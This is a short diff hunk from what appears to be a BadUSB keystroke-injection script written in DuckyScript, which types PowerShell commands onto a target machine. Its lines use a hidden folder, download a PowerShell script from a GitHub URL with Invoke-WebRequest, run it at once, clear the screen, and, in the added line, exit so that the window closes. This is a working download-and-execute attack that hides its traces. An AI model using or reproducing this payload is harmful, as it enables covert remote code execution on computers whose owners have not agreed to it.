@@ -16,3 +16,4 @@ STRINGLN $trycatchfolder.Attributes -= "Hidden"
 STRINGLN cd .\trycatchthishiddenfolder
 STRINGLN Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/trycatchme.ps1" -OutFile "t.ps1"; .\t.ps1
 STRINGLN clear
+STRINGLN exit
